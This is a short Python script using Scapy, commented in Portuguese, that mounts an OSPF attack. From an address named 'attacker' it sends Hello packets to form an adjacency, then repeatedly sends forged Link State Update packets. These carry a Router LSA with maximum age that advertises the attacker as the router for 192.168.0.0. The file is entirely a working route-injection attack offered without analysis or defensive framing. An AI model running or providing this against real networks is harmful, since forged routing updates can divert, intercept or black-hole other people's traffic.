from scapy.all import *
import time

# Carregando OSPF
load_contrib('ospf')

def hello(attacker):

	# Pacote IP
	ip = IP(src = attacker, dst = '224.0.0.5', ttl = 1)

	# Criando Pacotes OSPF
	ospf_hdr = OSPF_Hdr(src = attacker, area = '0.0.0.1')		# Pacote OSPF (Cabecalho Inicial)	
	ospf_hello = OSPF_Hello(router = attacker, options = 'E')	# Pacote OSPF (Hello)

	# Pacote Completo
	pacote = ip / ospf_hdr / ospf_hello
	
	# Obtendo respostas
	sucesso, perdidos = sr(pacote, timeout = 10, multi = True, iface = 'wlan0')
		
def update(attacker, netmask):

	# Pacote IP
	ip = IP(src = attacker, dst = '224.0.0.6', ttl = 1)							

	# Criando Pacotes OSPF
	ospf_hdr = OSPF_Hdr(src = attacker, area = '0.0.0.1')		# Pacote OSPF (Cabecalho Inicial)
	ospf_link = OSPF_Link(id = netmask, data = '255.255.255.0')	# Pacote OSPF (Link)	
	ospf_lsa = OSPF_Router_LSA(age = 3600, id = attacker, adrouter = attacker, options = 'E', linklist = [ospf_link])	# Pacote OSPF (Router LSA)
	ospf_lsu = OSPF_LSUpd(lsalist = [ospf_lsa])			# Pacote OSPF (Link State Update)
	
	# Pacote Completo
	pacote = ip / ospf_hdr /ospf_lsu 
	send(pacote)

def main():

	attacker = '192.168.0.1'
	netmask = '192.168.0.0'

	for i in range(6):

		hello(attacker)
		time.sleep(10)

	for i in range(3):

		update(attacker, netmask)
		time.sleep(10)

main()
